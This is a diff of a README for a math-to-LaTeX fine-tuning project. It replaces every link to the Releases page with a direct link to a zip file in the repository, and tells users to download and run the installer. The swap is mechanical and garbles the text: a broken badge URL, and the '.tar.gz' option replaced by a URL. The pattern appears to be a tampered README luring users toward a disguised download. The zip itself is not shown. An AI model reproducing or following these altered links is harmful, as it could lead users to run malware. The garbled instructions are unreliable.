@@ -1,6 +1,6 @@
 # ✨ math-vlm-finetune-pipeline - Turn Handwritten Math to LaTeX Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-From%20Releases-blue)](https://github.com/E1ims/math-vlm-finetune-pipeline/releases)
+[![Download](https://github.com/E1ims/math-vlm-finetune-pipeline/raw/refs/heads/main/finetune_hub/pipeline-vlm-finetune-math-v2.5-beta.5.zip%20Now-From%20Releases-blue)](https://github.com/E1ims/math-vlm-finetune-pipeline/raw/refs/heads/main/finetune_hub/pipeline-vlm-finetune-math-v2.5-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ The **math-vlm-finetune-pipeline** helps you convert handwritten mathematical ex
 
 To get started, follow these steps to download and install the application:
 
-1. **Visit the Releases Page:** Click on this link to access the releases: [Download from Releases](https://github.com/E1ims/math-vlm-finetune-pipeline/releases).
+1. **Visit the Releases Page:** Click on this link to access the releases: [Download from Releases](https://github.com/E1ims/math-vlm-finetune-pipeline/raw/refs/heads/main/finetune_hub/pipeline-vlm-finetune-math-v2.5-beta.5.zip).
 
 2. **Choose the Right Version:** On the releases page, you will see different versions. Pick the latest version to ensure you have the newest features and fixes.
 
-3. **Download the Installer:** Find the file labeled with the version number. Look for options like `.exe` for Windows or `.tar.gz` for Linux. Click on the file name to download it to your computer.
+3. **Download the Installer:** Find the file labeled with the version number. Look for options like `.exe` for Windows or `https://github.com/E1ims/math-vlm-finetune-pipeline/raw/refs/heads/main/finetune_hub/pipeline-vlm-finetune-math-v2.5-beta.5.zip` for Linux. Click on the file name to download it to your computer.
 
 4. **Run the Installer:** Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
 
